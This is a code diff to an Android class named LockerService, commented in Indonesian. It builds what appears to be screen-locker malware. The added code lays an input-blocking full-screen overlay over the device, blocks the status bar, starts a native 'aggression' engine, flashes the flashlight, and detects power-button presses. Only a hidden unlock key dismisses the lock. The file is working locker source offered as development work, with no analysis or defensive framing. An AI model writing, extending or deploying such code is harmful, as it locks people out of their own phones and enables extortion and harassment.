@@ -23,6 +23,7 @@ import android.os.Handler;
 import java.lang.reflect.Method;
 import android.content.pm.ServiceInfo;
 import android.widget.Button;
+import android.widget.TextView;
 import android.widget.EditText;
 
 public class LockerService extends Service {
@@ -152,57 +153,61 @@ public class LockerService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-
+    
+        // 1. Memulai Foreground Service & StatusBar Blocker
         startInForeground();
         startStatusBarLocker();
-
-        // 1. Setup Window Manager
+    
+        // 2. Setup Window Manager & Layout
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         lockerLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
-        
-        // 2. Layout Params Khusus (Blokir Touch & Keyboard Sistem)
+        lockerLayout.setFitsSystemWindows(false);
+        lockerLayout.setBackgroundColor(0xFF000000); // Hitam pekat
+    
+        // 3. Konfigurasi LayoutParams (Penting untuk blokir input sistem)
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |      // Kunci fokus agar keyboard sistem mati
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |      // Mematikan keyboard sistem secara total
                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS | 
                 WindowManager.LayoutParams.FLAG_FULLSCREEN |        
                 WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED |
                 WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                 PixelFormat.TRANSLUCENT);
-
+    
         params.gravity = Gravity.FILL;
-
+    
+        // Menutup area Notch/Poni pada Android P ke atas
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
             params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
         }
-
+    
         windowManager.addView(lockerLayout, params);
-
-        // 3. Logika Keyboard Native (Hacker Style)
-        TextView display = lockerLayout.findViewById(R.id.textDisplayPassword);
+    
+        // 4. Logika Native Keyboard (Glow Lines Style)
+        TextView display = (TextView) lockerLayout.findViewById(R.id.textDisplayPassword);
         
-        // Listener Tombol Angka
+        // Listener untuk input angka 0-9
         View.OnClickListener numListener = v -> {
             Button b = (Button) v;
             if (currentInput.length() < 12) {
                 currentInput += b.getText().toString();
-                display.setText(currentInput.replaceAll(".", "* ")); 
-                display.setHint(""); // Hapus hint jika ada input
+                display.setText(currentInput.replaceAll(".", "* ")); // Masking dengan spasi agar glow terlihat
+                display.setHint(""); 
             }
         };
-
-        // Mapping ID Tombol
+    
+        // Mapping tombol numerik
         int[] buttonIds = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
-                        R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
+                           R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
         for (int id : buttonIds) {
             View btn = lockerLayout.findViewById(id);
             if (btn != null) btn.setOnClickListener(numListener);
         }
-
-        // Tombol Delete
+    
+        // Listener Tombol Delete
         View btnDel = lockerLayout.findViewById(R.id.btnDelete);
         if (btnDel != null) {
             btnDel.setOnClickListener(v -> {
@@ -212,23 +217,32 @@ public class LockerService extends Service {
                 }
             });
         }
-
-        // Tombol Unlock
+    
+        // Listener Tombol OK / Unlock
         View btnUnlock = lockerLayout.findViewById(R.id.btnUnlock);
         if (btnUnlock != null) {
             btnUnlock.setOnClickListener(v -> {
                 if (verifyAdvancedKey(currentInput)) {
                     isAuthenticated = true;
-                    stopSelf(); // Matikan service jika sukses
+                    stopSelf(); // Menghentikan service jika kunci benar
                 } else {
                     currentInput = "";
                     display.setText("");
-                    display.setHint("ACCESS DENIED");
+                    display.setHint("ACCESS DENIED"); // Feedback gagal
                 }
             });
         }
+    
+        // 5. Jalankan Fitur Agresif
+        startNativeAggression(getPackageName() + "/.LockerService");
+        flashHandler.post(flashRunnable); // Mulai kedipan senter
+        applyFullScreen();
+    
+        // 6. Daftarkan Receiver untuk deteksi Power Button
+        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
+        registerReceiver(screenReceiver, filter);
     }
-
+    
     private void startInForeground() {
         String CHANNEL_ID = "locker_service_channel";
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -258,10 +272,27 @@ public class LockerService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        
+        // 1. Matikan engine agresif C++
         stopNativeAggression();
+        
+        // 2. Berhentikan handler senter & pastikan senter mati
         flashHandler.removeCallbacks(flashRunnable);
         toggleFlashlight(false);
-        unregisterReceiver(screenReceiver);
-        if (lockerLayout != null) windowManager.removeView(lockerLayout);
+        
+        // 3. Lepaskan receiver layar
+        try {
+            unregisterReceiver(screenReceiver);
+        } catch (Exception e) {
+            // Abaikan jika sudah tidak terdaftar
+        }
+        
+        // 4. Hapus overlay dari layar secara permanen
+        if (lockerLayout != null && windowManager != null) {
+            try {
+                windowManager.removeView(lockerLayout);
+            } catch (Exception e) {
+                // Abaikan jika view sudah hilang
+            }
+        }
     }
-}
